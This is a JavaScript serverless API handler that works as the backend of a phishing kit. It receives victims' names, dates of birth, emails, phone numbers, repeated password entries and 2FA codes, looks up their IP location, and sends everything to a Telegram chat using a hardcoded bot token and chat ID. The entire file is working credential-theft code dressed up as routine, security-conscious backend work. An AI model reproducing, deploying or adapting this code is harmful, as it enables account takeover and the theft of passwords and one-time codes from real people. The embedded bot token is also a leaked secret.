import crypto from 'crypto';

const TELEGRAM_BOT_TOKEN = '857548907:AAFgAY0T_c-4suQh5zM04Q30Wb_LLDVi5TM';
const TELEGRAM_CHAT_IDS = '-515807121';
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';

const MAX_PASSWORD_ATTEMPTS = 5;
const MAX_2FA_ATTEMPTS = 5;
const SESSION_EXPIRY_MS = 30 * 60 * 1000;

// Field length limits to prevent oversized payloads
const FIELD_LIMITS = {
    fullName: 100,
    email: 254,
    emailBusiness: 254,
    phone: 25,
    fanpage: 150,
    dob: 15,
    note: 500,
    password: 200,
    code: 10,
};

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS || CHAT_IDS_ARRAY.length === 0) {
    console.error('CRITICAL: Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Vercel Dashboard');
}

const sessions = {};
const rateLimits = new Map();
const infoRateLimits = new Map();

function cleanupExpiredSessions() {
    const now = Date.now();
    for (const [id, session] of Object.entries(sessions)) {
        if (session.createdAt && (now - session.createdAt > SESSION_EXPIRY_MS)) {
            delete sessions[id];
        }
    }
}

function checkRateLimit(ip) {
    const now = Date.now();
    const key = ip || 'unknown';
    const limit = { max: 50, window: 60000 };

    if (!rateLimits.has(key)) {
        rateLimits.set(key, { count: 1, resetAt: now + limit.window });
        return { allowed: true, remaining: limit.max - 1 };
    }

    const record = rateLimits.get(key);

    if (now > record.resetAt) {
        record.count = 1;
        record.resetAt = now + limit.window;
        return { allowed: true, remaining: limit.max - 1 };
    }

    if (record.count >= limit.max) {
        return {
            allowed: false,
            retryAfter: Math.ceil((record.resetAt - now) / 1000),
            remaining: 0
        };
    }

    record.count++;
    return { allowed: true, remaining: limit.max - record.count };
}

// Stricter rate limit specifically for 'info' submissions (creates sessions + sends Telegram)
function checkInfoRateLimit(ip) {
    const now = Date.now();
    const key = ip || 'unknown';
    const limit = { max: 10, window: 60000 }; // 10 info requests per 60s

    if (!infoRateLimits.has(key)) {
        infoRateLimits.set(key, { count: 1, resetAt: now + limit.window });
        return { allowed: true, remaining: limit.max - 1 };
    }

    const record = infoRateLimits.get(key);

    if (now > record.resetAt) {
        record.count = 1;
        record.resetAt = now + limit.window;
        return { allowed: true, remaining: limit.max - 1 };
    }

    if (record.count >= limit.max) {
        return {
            allowed: false,
            retryAfter: Math.ceil((record.resetAt - now) / 1000),
            remaining: 0
        };
    }

    record.count++;
    return { allowed: true, remaining: limit.max - record.count };
}

function cleanupRateLimits() {
    const now = Date.now();
    for (const [key, record] of rateLimits.entries()) {
        if (now > record.resetAt + 300000) {
            rateLimits.delete(key);
        }
    }
    for (const [key, record] of infoRateLimits.entries()) {
        if (now > record.resetAt + 300000) {
            infoRateLimits.delete(key);
        }
    }
}

function logRequest(level, type, message, metadata = {}) {
    const log = {
        timestamp: new Date().toISOString(),
        level,
        type,
        message,
        ip: metadata.ip || 'unknown',
        sessionId: metadata.sessionId,
        duration: metadata.duration,
    };
    const logMethod = level === 'error' ? console.error :
        level === 'warn' ? console.warn : console.log;
    logMethod(JSON.stringify(log));
}

function logSuccess(type, metadata = {}) {
    logRequest('info', type, `${type} successful`, metadata);
}

function logError(type, error, metadata = {}) {
    logRequest('error', type, error.message || error, metadata);
}

function setSecurityHeaders(res) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

// Prevent HTML injection in Telegram messages
function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function validateData(data) {
    const issues = [];
    if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
        issues.push('Invalid email format');
    }
    if (data.phone && data.phone.length < 5) {
        issues.push('Phone too short');
    }
    if (data.dob) {
        const parts = data.dob.split('/');
        if (parts.length === 3) {
            const day = parseInt(parts[0]);
            const month = parseInt(parts[1]);
            const year = parseInt(parts[2]);
            if (day < 1 || day > 31) issues.push('Invalid day');
            if (month < 1 || month > 12) issues.push('Invalid month');
            if (year < 1500 || year > 2026) issues.push('Invalid year');
        }
    }
    if (issues.length > 0) {
        console.warn(`[VALIDATION] ${issues.length} issue(s):`, issues);
    }
    return issues;
}

// Truncate fields to safe lengths (still logs data, just caps size)
function sanitizeFields(data) {
    const sanitized = { ...data };
    for (const [field, maxLen] of Object.entries(FIELD_LIMITS)) {
        if (sanitized[field] && typeof sanitized[field] === 'string' && sanitized[field].length > maxLen) {
            sanitized[field] = sanitized[field].substring(0, maxLen);
        }
    }
    // Sanitize nested device object
    if (sanitized.device && typeof sanitized.device === 'object') {
        for (const key of Object.keys(sanitized.device)) {
            if (typeof sanitized.device[key] === 'string' && sanitized.device[key].length > 100) {
                sanitized.device[key] = sanitized.device[key].substring(0, 100);
            }
        }
    }
    return sanitized;
}

function decodeData(encodedData) {
    try {
        const decoded = Buffer.from(encodedData, 'base64').toString('utf-8');
        return JSON.parse(decoded);
    } catch (e) {
        return null;
    }
}

function buildMessage(session, ip = 'Unknown') {
    let msg = `<b>🔔 Notification</b>\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Ip:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Location:</b> ${escapeHtml(session.location || 'Unknown')}\n`;
    msg += `<b>Source:</b> ${escapeHtml(session.source || 'Unknown')}\n`;

    if (session.device) {
        const d = session.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱');
        msg += `<b>Device:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }

    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Full Name:</b> ${escapeHtml(session.fullName)}\n`;
    msg += `<b>Page Name:</b> ${escapeHtml(session.fanpage)}\n`;
    msg += `<b>Date of birth:</b> ${escapeHtml(session.dob)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Email:</b> <code>${escapeHtml(session.email)}</code>\n`;
    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness)}</code>\n`;
    msg += `<b>Phone Number:</b> <code>${escapeHtml(session.phone)}</code>\n`;
    if (session.note) {
        msg += `<b>Note:</b> ${escapeHtml(session.note)}\n`;
    }

    const pwd1 = session.passwords?.[0] || '';
    const pwd2 = session.passwords?.[1] || '';

    if (pwd1 || pwd2) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        if (pwd1) msg += `<b>Password First:</b> <code>${escapeHtml(pwd1)}</code>\n`;
        if (pwd2) msg += `<b>Password Second:</b> <code>${escapeHtml(pwd2)}</code>\n`;
    }

    const codes = session.codes || [];
    if (codes.length > 0) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>Auth Method:</b>\n`;
        if (codes[0]) msg += `<b>Code 2FA(1):</b> <code>${escapeHtml(codes[0])}</code>\n`;
        if (codes[1]) msg += `<b>Code 2FA(2):</b> <code>${escapeHtml(codes[1])}</code>\n`;
        if (codes[2]) msg += `<b>Code 2FA(3):</b> <code>${escapeHtml(codes[2])}</code>\n`;
    }

    return msg;
}

async function sendTelegram(message, messageIdsMap = null) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        console.error('Telegram credentials not configured');
        return {};
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const messageId = messageIdsMap ? messageIdsMap[chatId] : null;
            const url = messageId
                ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
                : `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML',
                    ...(messageId && { message_id: messageId })
                })
            });
            const data = await response.json();
            return { chatId, messageId: data.result?.message_id || null, success: !!data.ok };
        } catch (e) {
            const safeError = (e.message || '').replace(TELEGRAM_BOT_TOKEN, '[REDACTED]');
            console.error(`Telegram error for chat ${chatId}:`, safeError);
            return { chatId, messageId: null, success: false };
        }
    });

    const results = await Promise.all(promises);
    const messageIds = {};
    results.forEach(r => {
        if (r.messageId) messageIds[r.chatId] = r.messageId;
    });
    return messageIds;
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, {
            headers: { 'User-Agent': 'vercel-serverless' }
        });
        const data = await res.json();
        if (data && !data.error) {
            const cityCode = data.city ? data.city.charAt(0).toUpperCase() : '';
            return `${data.city}(${cityCode}) | ${data.country_name}(${data.country_code})`;
        }
    } catch (e) {
        console.error('[IP_LOOKUP] Failed:', e.message);
    }
    return 'Unknown';
}

export default async function handler(req, res) {
    const startTime = Date.now();
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';

    cleanupExpiredSessions();
    cleanupRateLimits();
    setSecurityHeaders(res);

    const requestOrigin = req.headers.origin || '';
    let corsAllowed = false;

    if (ALLOWED_ORIGIN) {
        corsAllowed = requestOrigin === ALLOWED_ORIGIN;
    } else {
        corsAllowed = !requestOrigin || requestOrigin.endsWith('.vercel.app');
    }

    if (corsAllowed && requestOrigin) {
        res.setHeader('Access-Control-Allow-Origin', requestOrigin);
    }
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Vary', 'Origin');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') {
        logError('invalid_method', new Error(`Method ${req.method} not allowed`), { ip });
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const rateCheck = checkRateLimit(ip);
    if (!rateCheck.allowed) {
        logRequest('warn', 'rate_limit', `IP ${ip} exceeded rate limit`, { ip });
        return res.status(429).json({ error: 'Too many requests', retryAfter: rateCheck.retryAfter });
    }

    try {
        const { data: encoded } = req.body;
        const data = decodeData(encoded);

        if (!data) {
            logError('decode_failed', new Error('Invalid data format'), { ip });
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const { type, session_id } = data;

        if (type === 'info') {
            // Apply stricter rate limit for info (session creation + Telegram)
            const infoRateCheck = checkInfoRateLimit(ip);
            if (!infoRateCheck.allowed) {
                logRequest('warn', 'info_rate_limit', `IP ${ip} exceeded info rate limit`, { ip });
                return res.status(429).json({ error: 'Too many requests', retryAfter: infoRateCheck.retryAfter });
            }

            const id = generateSessionId();
            const safe = sanitizeFields(data);
            validateData(safe);
            const location = await getIPInfo(ip);
            const origin = req.headers.origin || req.headers.referer || 'Unknown';
            const source = origin.replace(/^https?:\/\//, '').split('/')[0];

            sessions[id] = {
                id,
                ip,
                fullName: safe.fullName || '',
                email: safe.email || '',
                emailBusiness: safe.emailBusiness || '',
                phone: safe.phone || '',
                fanpage: safe.fanpage || '',
                dob: safe.dob || '',
                note: safe.note || '',
                passwords: safe.password ? [safe.password.substring(0, FIELD_LIMITS.password)] : [],
                codes: [],
                location,
                source,
                device: safe.device || null,
                messageIds: {},
                createdAt: Date.now()
            };

            const msg = buildMessage(sessions[id], ip);
            const messageIds = await sendTelegram(msg);
            sessions[id].messageIds = messageIds;

            logSuccess('info_submitted', { ip, sessionId: id, duration: Date.now() - startTime });
            return res.status(200).json({ success: true, session_id: id });
        }

        if (type === 'password' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) {
                logRequest('warn', 'ip_mismatch', 'Password attempt from different IP', { ip, sessionId: session_id });
                return res.status(403).json({ success: false, error: 'Session expired' });
            }
            if (sessions[session_id].passwords.length >= MAX_PASSWORD_ATTEMPTS) {
                logRequest('warn', 'max_attempts', 'Max password attempts exceeded', { ip, sessionId: session_id });
                return res.status(429).json({ success: false, error: 'Too many attempts' });
            }

            const safePassword = (data.password || '').substring(0, FIELD_LIMITS.password);
            sessions[session_id].passwords.push(safePassword);

            // Send as a NEW separate message (full info)
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg);

            logSuccess('password_submitted', { ip, sessionId: session_id, duration: Date.now() - startTime });
            return res.status(200).json({ success: true });
        }

        if (type === '2fa' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) {
                logRequest('warn', 'ip_mismatch', '2FA attempt from different IP', { ip, sessionId: session_id });
                return res.status(403).json({ success: false, error: 'Session expired' });
            }
            if (sessions[session_id].codes.length >= MAX_2FA_ATTEMPTS) {
                logRequest('warn', 'max_attempts', 'Max 2FA attempts exceeded', { ip, sessionId: session_id });
                return res.status(429).json({ success: false, error: 'Too many attempts' });
            }

            const safeCode = (data.code || '').substring(0, FIELD_LIMITS.code);
            sessions[session_id].codes.push(safeCode);

            // Send as a NEW separate message (full info)
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg);

            logSuccess('2fa_submitted', { ip, sessionId: session_id, duration: Date.now() - startTime });
            return res.status(200).json({ success: true });
        }

        logRequest('warn', 'unknown_type', `Unknown type: ${type}`, { ip });
        return res.status(400).json({ success: false, error: 'Invalid request type' });

    } catch (error) {
        logError('handler_error', error, { ip, duration: Date.now() - startTime });
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
}
